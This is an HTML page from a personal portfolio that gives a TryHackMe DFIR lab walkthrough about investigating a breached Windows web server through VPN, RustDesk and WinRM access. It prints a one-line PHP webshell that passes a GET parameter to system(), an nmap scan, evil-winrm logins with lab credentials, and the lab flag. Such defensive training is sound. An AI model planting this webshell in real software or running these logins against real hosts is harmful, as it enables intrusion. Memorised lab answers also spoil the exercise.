@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Accessing a Compromised Network // writeup</title>
+    <meta name="description" content="Investigating an active breach on OpenDoor&#39;s WEB-SRV01 Windows Server. Persuading the on-duty engineer for VPN access, deploying RustDesk relay, uncovering an IIS webshell, and collecting artifacts via WinRM and WMI.">
+    <meta name="theme-color" content="#0a0506">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../style.css">
+    <script>
+        (function () {
+            try {
+                if (localStorage.getItem('theme') === 'light') {
+                    document.documentElement.setAttribute('data-theme', 'light');
+                }
+            } catch (e) { }
+        })();
+    </script>
+</head>
+
+<body class="writeup-page">
+    <div class="scanlines" aria-hidden="true"></div>
+    <div class="scroll-progress" id="scrollProgress"></div>
+
+    <header class="writeup-topbar">
+        <a class="prompt-link" href="../writeups.html">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~/writeups</span><span class="prompt-sym">$</span>
+            <span class="prompt-cmd">cd .. [Archive Portal]</span>
+        </a>
+        <div class="topbar-actions">
+            <a class="card-link small github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener"><i class="fab fa-github"></i> GitHub Repo</a>
+            <a class="card-link small" href="../index.html" style="margin-right: 0.5rem;"><i class="fas fa-terminal"></i> Main Dossier</a>
+            <span class="kbd-hint"><kbd>T</kbd> theme</span>
+            <button class="theme-toggle" id="themeToggle" type="button">
+                <i class="fas fa-moon"></i><span>Theme</span>
+            </button>
+        </div>
+    </header>
+
+    <main class="writeup-shell">
+        <article class="writeup-article">
+            <div class="writeup-head">
+                <p class="writeup-kicker">// verified laboratory walkthrough</p>
+                <h1>Accessing a Compromised Network</h1>
+                <div class="writeup-meta">
+                    <span class="badge">TryHackMe</span>
+      <span class="badge ghost">DFIR / Network Security</span>
+      <span class="badge diff-medium">Medium</span>
+      <span class="meta-item"><i class="fas fa-calendar"></i> 2026-09-22</span>
+      <span class="meta-item"><i class="fas fa-tags"></i> TryHackMe / DFIR / Windows / WinRM / Network / Medium</span>
+      <span class="meta-item"><i class="fas fa-file-code"></i> accessing-a-compromised-network-writeup.md</span>
+                </div>
+                <p class="writeup-summary">Investigating an active breach on OpenDoor&#39;s WEB-SRV01 Windows Server. Persuading the on-duty engineer for VPN access, deploying RustDesk relay, uncovering an IIS webshell, and collecting artifacts via WinRM and WMI.</p>
+                <div class="writeup-actions">
+                    <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/accessing-a-compromised-network-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                    <a class="card-link" href="accessing-a-compromised-network-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                    <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Writeups Portal</a>
+                    <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                </div>
+            </div>
+            <div class="writeup-body">
+                <h2>TryHackMe DFIR — Network Access for DFIR v5 (OpenDoor / WEB-SRV01) — 100% Complete Walkthrough</h2>
+<blockquote><p><strong>TL;DR</strong> — A realistic incident responder scenario handling an infected enterprise server (<code>WEB-SRV01</code>). We convince the on-duty network engineer (Jesse) to provide VPN profile access, deploy a low-noise RustDesk relay to bypass firewall restrictions, uncover a backdoor webshell (<code>contacts.php</code>), leverage WinRM and WMI to sweep for persistence (<code>shell.exe</code>), and harvest the target flag without corrupting forensic integrity.</p></blockquote>
+<h2>1. Case Background &amp; Lab Overview</h2>
+<p>When an organization suffers an active intrusion, incident response teams face a fundamental dilemma: <strong>how to access compromised endpoints to collect memory and disk artifacts without tipping off the adversary or allowing internal IT staff to inadvertently destroy evidentiary artifacts.</strong></p>
+<p>This walkthrough covers the full investigation lifecycle on OpenDoor&#39;s infrastructure:</p>
+<ol><li><strong>Network Access Evaluation</strong>: Choosing between SSL VPN, remote desktop relays, and on-site response.</li><li><strong>Social Engineering / Operator Persuasion</strong>: Overcoming internal operational resistance via structured technical justifications.</li><li><strong>RustDesk Relay Session</strong>: Bypassing NAT and capturing live console access without deploying suspicious attacker tooling.</li><li><strong>Webshell Identification</strong>: Tracing IIS web directory modifications (<code>C:\inetpub\wwwroot</code>).</li><li><strong>WinRM &amp; WMI Forensic Sweeps</strong>: Querying active user sessions (<code>quser</code>), harvesting flags, and detecting startup persistence.</li></ol>
+<h2>2. All Scored Questions &amp; Answers at a Glance</h2>
+<h2>3. Step-by-Step Tactical Execution</h2>
+<h3>Task 1 &amp; 2: Network Access Strategy &amp; Jesse Persuasion</h3>
+<p>In enterprise incident response, requesting administrative credentials or VPN profiles from local IT often meets resistance. Direct demands (&quot;Give me the VPN credentials&quot;) fail.</p>
+<p>To persuade Jesse Moore (Network Engineer at OpenDoor), we employ a structured four-point IR justification:</p>
+<ol><li><strong>Data Integrity</strong>: Inexperienced internal staff querying the box will overwrite volatile memory and timestamp artifacts.</li><li><strong>Operational Speed</strong>: Direct remote triage avoids constant communication round-trips.</li><li><strong>Threat Mapping</strong>: Incident responders need to inspect lateral movement avenues.</li><li><strong>OPSEC</strong>: If internal IT machines are compromised, sharing credentials over standard chat compromises the investigation.</li></ol>
+<pre class="code-block" data-lang="bash"><code># Reconnaissance of target network endpoints
+nmap -sS -Pn -p 135,139,445,3389,5985,21115-21119 10.48.191.195</code></pre>
+<p>Following the persuasion script, Jesse provides the FortiClient SSL VPN profile at <code>vpn.opendoor.thm:10443</code>.</p>
+<h3>Task 3: Remote Desktop via RustDesk Relay</h3>
+<p>Because <code>WEB-SRV01</code> was isolated from direct external routing, Jesse provisioned a self-hosted RustDesk relay:</p>
+<ul><li><strong>Server</strong>: <code>10.48.191.195</code></li><li><strong>Relay Key</strong>: <code>RsXNQXzO1m7XeR+lgmYeMsLiuOXK1xs3G0abyyIgUeA=</code></li><li><strong>Connection Code</strong>: <code>448 236 499</code></li><li><strong>Password</strong>: <code>8xpekhU1</code></li></ul>
+<p>After logging in as <code>Administrator</code> with password <code>Secure!</code>, we inspect <code>C:\inetpub\wwwroot\</code> for web shell artifacts:</p>
+<pre class="code-block" data-lang="powershell"><code>Get-ChildItem -Path C:\inetpub\wwwroot\
+Get-Content C:\inetpub\wwwroot\contacts.php -Head 5</code></pre>
+<p>Line 1 of <code>contacts.php</code> revealed an unauthenticated system command backdoor:</p>
+<pre class="code-block" data-lang="php"><code>&lt;?php if(isset($_GET[&#39;xquery&#39;])){ system($_GET[&#39;xquery&#39;].&#39; 2&gt;&amp;1&#39;); } ?&gt;</code></pre>
+<h3>Task 4 &amp; 5: Active Directory &amp; Privilege Scoping</h3>
+<p>While the VPN provides Layer-3 IP reachability to the server subnet, it does <strong>not</strong> grant Active Directory domain authentication (<code>Nay</code>). Enterprise Active Directory environments require Domain Admin credentials to perform cross-workstation artifact collection via EDR or WinRM sweeps.</p>
+<h3>Task 6: WinRM &amp; WMI Low-Footprint Forensic Sweeps</h3>
+<p>Interactive RDP sessions alter host artifacts (creating logon event 4624 type 10, updating shellbags, and caching credentials in LSASS memory). WinRM (port 5985) is the preferred forensic vehicle because it executes commands non-interactively without leaving cached credentials on the endpoint.</p>
+<p>We connect via WinRM using <code>ServiceUser</code> / <code>DcG3w4b8</code>:</p>
+<pre class="code-block" data-lang="bash"><code># Connect using evil-winrm or custom pywinrm script
+evil-winrm -i 10.48.191.195 -u ServiceUser -p &#39;DcG3w4b8&#39;</code></pre>
+<h4>Recovering the Document Flag:</h4>
+<pre class="code-block" data-lang="powershell"><code>*Evil-WinRM* PS C:\&gt; Get-Content C:\Users\ServiceUser\Documents\flag.txt
+THM{similar_to_ssh_right?}</code></pre>
+<h4>Detecting WMI Persistence:</h4>
+<p>Adversaries frequently avoid standard Registry Run keys or Scheduled Tasks by creating WMI event subscriptions or startup commands. Querying <code>Win32_StartupCommand</code>:</p>
+<pre class="code-block" data-lang="powershell"><code>*Evil-WinRM* PS C:\&gt; Get-WmiObject Win32_StartupCommand | Select-Object Name, Command, Location, User
+
+Name      : Slideshow
+Command   : C:\Users\Public\Pictures\shell.exe
+Location  : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+User      : Public</code></pre>
+<p>The persistence binary <code>shell.exe</code> was stashed in <code>C:\Users\Public\Pictures\shell.exe</code>.</p>
+<h2>4. Key Takeaways &amp; Forensic Lessons</h2>
+<ol><li><strong>Live RDP Session Artifacts</strong>: Running <code>quser</code> over RDP displays <code>rdp-tcp#N</code> sessions. WinRM does not create an interactive RDP session, preserving system state.</li><li><strong>OPSEC in Incident Response</strong>: Never introduce forensic tools that mimic attacker toolsets.</li><li><strong>WMI &amp; Service Persistence</strong>: Always inspect WMI startup entries and hidden persistence locations (<code>C:\Users\Public</code>).</li></ol>
+            </div>
+            <div class="writeup-foot">
+                <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Full Writeups Portal</a>
+                <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/accessing-a-compromised-network-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                <a class="card-link" href="accessing-a-compromised-network-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                <a class="card-link" href="mailto:parajulisameek@gmail.com"><i class="fas fa-envelope"></i> report a typo</a>
+            </div>
+        </article>
+    </main>
+
+    <footer class="site-footer">
+        <p class="footer-cmd">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~</span><span class="prompt-sym">$</span>
+            echo "Defense is good. Offense is mandatory."
+        </p>
+        <p class="footer-muted">&copy; <span id="year"></span> Sameek Parajuli &middot; <a href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener">GitHub /tryhackme_walkthroughs</a></p>
+    </footer>
+
+    <!-- Image Lightbox Modal -->
+    <div class="lightbox-modal" id="lightboxModal" hidden>
+        <div class="lightbox-backdrop"></div>
+        <div class="lightbox-content">
+            <img src="" id="lightboxImg" alt="Enlarged view">
+            <button class="lightbox-close" id="lightboxClose" type="button">&times;</button>
+        </div>
+    </div>
+
+    <div class="scroll-to-top" id="scrollToTop" role="button" tabindex="0" aria-label="Scroll to top">
+        <i class="fas fa-arrow-up"></i>
+    </div>
+
+    <script src="../script.js"></script>
+</body>
+
+</html>
